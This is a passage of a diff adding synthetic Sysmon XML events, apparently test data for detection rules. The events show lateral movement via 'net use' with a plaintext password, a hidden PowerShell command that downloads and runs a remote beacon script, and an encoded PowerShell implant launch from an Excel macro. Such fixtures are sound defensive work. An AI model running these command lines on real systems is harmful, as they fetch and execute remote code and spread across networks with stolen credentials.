+         <Data Name="Hashes">SHA1=CC001122334455667788990011223344CC001122,MD5=CC0000DDEE11223344556677889900AA,SHA256=CC00112233445566778899DDEEFFAABB001122334455667788990011CC00,IMPHASH=CC001234DDEE5678AABB9012CC003456</Data>
+         <Data Name="ParentProcessGuid">{a1b2c3d4-8800-674c-7000-000000000c00}</Data>
+         <Data Name="ParentProcessId">4200</Data>
+         <Data Name="ParentImage">C:\Windows\System32\cmd.exe</Data>
+         <Data Name="ParentCommandLine">"C:\Windows\System32\cmd.exe"</Data>
+         <Data Name="ParentUser">CONDEF\Administrator</Data>
+      </EventData>
+   </Event>
+
+   <!-- Event 13: net use lateral movement to file share -->
+   <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+      <System>
+         <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
+         <EventID>1</EventID>
+         <Version>5</Version>
+         <Level>4</Level>
+         <Task>1</Task>
+         <Opcode>0</Opcode>
+         <Keywords>0x8000000000000000</Keywords>
+         <TimeCreated SystemTime="2024-12-05T09:17:45.3330000Z" />
+         <EventRecordID>5013</EventRecordID>
+         <Correlation />
+         <Execution ProcessID="4028" ThreadID="5112" />
+         <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+         <Computer>win11v.condef.local</Computer>
+         <Security UserID="S-1-5-18" />
+      </System>
+      <EventData>
+         <Data Name="RuleName">technique_id=T1021.002,technique_name=SMB/Windows Admin Shares</Data>
+         <Data Name="UtcTime">2024-12-05 09:17:45.333</Data>
+         <Data Name="ProcessGuid">{a1b2c3d4-0013-674c-aa13-000000000c00}</Data>
+         <Data Name="ProcessId">9700</Data>
+         <Data Name="Image">C:\Windows\System32\net.exe</Data>
+         <Data Name="FileVersion">10.0.26100.1882 (WinBuild.160101.0800)</Data>
+         <Data Name="Description">Net Command</Data>
+         <Data Name="Product">Microsoft® Windows® Operating System</Data>
+         <Data Name="Company">Microsoft Corporation</Data>
+         <Data Name="OriginalFileName">net.exe</Data>
+         <Data Name="CommandLine">net use \\192.168.1.50\C$ /user:CONDEF\Administrator P@ssw0rd!</Data>
+         <Data Name="CurrentDirectory">C:\Windows\System32\</Data>
+         <Data Name="User">CONDEF\Administrator</Data>
+         <Data Name="LogonGuid">{a1b2c3d4-88b9-674c-6ead-160000000000}</Data>
+         <Data Name="LogonId">0x16ad6e</Data>
+         <Data Name="TerminalSessionId">1</Data>
+         <Data Name="IntegrityLevel">High</Data>
+         <Data Name="Hashes">SHA1=AABB1122334455667788990011223344AABB1122,MD5=AABBCCDDEEFF00112233445566778899,SHA256=AABB112233445566778899001122334455667788990011223344556677889900AA,IMPHASH=AABB1234CCDD5678EEFF9012AABB3456</Data>
+         <Data Name="ParentProcessGuid">{a1b2c3d4-8800-674c-7000-000000000c00}</Data>
+         <Data Name="ParentProcessId">4200</Data>
+         <Data Name="ParentImage">C:\Windows\System32\cmd.exe</Data>
+         <Data Name="ParentCommandLine">"C:\Windows\System32\cmd.exe"</Data>
+         <Data Name="ParentUser">CONDEF\Administrator</Data>
+      </EventData>
+   </Event>
+
+   <!-- Event 14: PowerShell with SYSTEM integrity spawned from services.exe -->
+   <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+      <System>
+         <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
+         <EventID>1</EventID>
+         <Version>5</Version>
+         <Level>4</Level>
+         <Task>1</Task>
+         <Opcode>0</Opcode>
+         <Keywords>0x8000000000000000</Keywords>
+         <TimeCreated SystemTime="2024-12-05T09:18:30.5550000Z" />
+         <EventRecordID>5014</EventRecordID>
+         <Correlation />
+         <Execution ProcessID="4028" ThreadID="5113" />
+         <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+         <Computer>win11v.condef.local</Computer>
+         <Security UserID="S-1-5-18" />
+      </System>
+      <EventData>
+         <Data Name="RuleName">technique_id=T1059.001,technique_name=PowerShell</Data>
+         <Data Name="UtcTime">2024-12-05 09:18:30.555</Data>
+         <Data Name="ProcessGuid">{a1b2c3d4-0014-674c-aa14-000000000c00}</Data>
+         <Data Name="ProcessId">9800</Data>
+         <Data Name="Image">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
+         <Data Name="FileVersion">10.0.26100.1882 (WinBuild.160101.0800)</Data>
+         <Data Name="Description">Windows PowerShell</Data>
+         <Data Name="Product">Microsoft® Windows® Operating System</Data>
+         <Data Name="Company">Microsoft Corporation</Data>
+         <Data Name="OriginalFileName">PowerShell.EXE</Data>
+         <Data Name="CommandLine">powershell.exe -NoP -NonI -W Hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://10.0.0.5/beacon.ps1')"</Data>
+         <Data Name="CurrentDirectory">C:\Windows\system32\</Data>
+         <Data Name="User">NT AUTHORITY\SYSTEM</Data>
+         <Data Name="LogonGuid">{a1b2c3d4-88b9-674c-e703-000000000000}</Data>
+         <Data Name="LogonId">0x3e7</Data>
+         <Data Name="TerminalSessionId">0</Data>
+         <Data Name="IntegrityLevel">System</Data>
+         <Data Name="Hashes">SHA1=F43D9BB316E30AE1A3494AC5B0624F6BEA1BF054,MD5=04029E121A0CFA5991749937DD22A1D9,SHA256=9F914D42706FE215501044ACD85A32D58AAEF1419D404FDDFA5D3B48F66CCD9F,IMPHASH=7782F9B5BCA0C9FF6B541ACC15E34D3A</Data>
+         <Data Name="ParentProcessGuid">{a1b2c3d4-8802-674c-7002-000000000c00}</Data>
+         <Data Name="ParentProcessId">700</Data>
+         <Data Name="ParentImage">C:\Windows\System32\services.exe</Data>
+         <Data Name="ParentCommandLine">C:\Windows\system32\services.exe</Data>
+         <Data Name="ParentUser">NT AUTHORITY\SYSTEM</Data>
+      </EventData>
+   </Event>
+
+   <!-- Event 15: encoded PowerShell spawned from Excel (macro-based) -->
+   <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+      <System>
+         <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
+         <EventID>1</EventID>
+         <Version>5</Version>
+         <Level>4</Level>
+         <Task>1</Task>
+         <Opcode>0</Opcode>
+         <Keywords>0x8000000000000000</Keywords>
+         <TimeCreated SystemTime="2024-12-05T09:20:00.7770000Z" />
+         <EventRecordID>5015</EventRecordID>
+         <Correlation />
+         <Execution ProcessID="4028" ThreadID="5114" />
+         <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+         <Computer>win11v.condef.local</Computer>
+         <Security UserID="S-1-5-18" />
+      </System>
+      <EventData>
+         <Data Name="RuleName">technique_id=T1059.001,technique_name=PowerShell</Data>
+         <Data Name="UtcTime">2024-12-05 09:20:00.777</Data>
+         <Data Name="ProcessGuid">{a1b2c3d4-0015-674c-aa15-000000000c00}</Data>
+         <Data Name="ProcessId">10100</Data>
+         <Data Name="Image">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
+         <Data Name="FileVersion">10.0.26100.1882 (WinBuild.160101.0800)</Data>
+         <Data Name="Description">Windows PowerShell</Data>
+         <Data Name="Product">Microsoft® Windows® Operating System</Data>
+         <Data Name="Company">Microsoft Corporation</Data>
+         <Data Name="OriginalFileName">PowerShell.EXE</Data>
+         <Data Name="CommandLine">powershell.exe -NoP -NonI -W Hidden -Enc cwB0AGEAcgB0AC0AcAByAG8AYwBlAHMAcwAgACcAQwA6AFwAVQBzAGUAcgBzAFwAUAB1AGIAbABpAGMAXABpAG0AcABsAGEAbgB0AC4AZQB4AGUAJwA=</Data>
+         <Data Name="CurrentDirectory">C:\Users\jsmith\AppData\Local\Temp\</Data>
+         <Data Name="User">CONDEF\jsmith</Data>
+         <Data Name="LogonGuid">{a1b2c3d4-88b9-674c-1111-160000000000}</Data>
+         <Data Name="LogonId">0x1a2b3c</Data>
+         <Data Name="TerminalSessionId">1</Data>
+         <Data Name="IntegrityLevel">Medium</Data>
+         <Data Name="Hashes">SHA1=F43D9BB316E30AE1A3494AC5B0624F6BEA1BF054,MD5=04029E121A0CFA5991749937DD22A1D9,SHA256=9F914D42706FE215501044ACD85A32D58AAEF1419D404FDDFA5D3B48F66CCD9F,IMPHASH=7782F9B5BCA0C9FF6B541ACC15E34D3A</Data>
+         <Data Name="ParentProcessGuid">{a1b2c3d4-8803-674c-7003-000000000c00}</Data>
+         <Data Name="ParentProcessId">8800</Data>
+         <Data Name="ParentImage">C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE</Data>
+         <Data Name="ParentCommandLine">"C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE" /n "C:\Users\jsmith\Downloads\q4_report.xlsm"</Data>
+         <Data Name="ParentUser">CONDEF\jsmith</Data>
+      </EventData>
+   </Event>
+
+</Events>
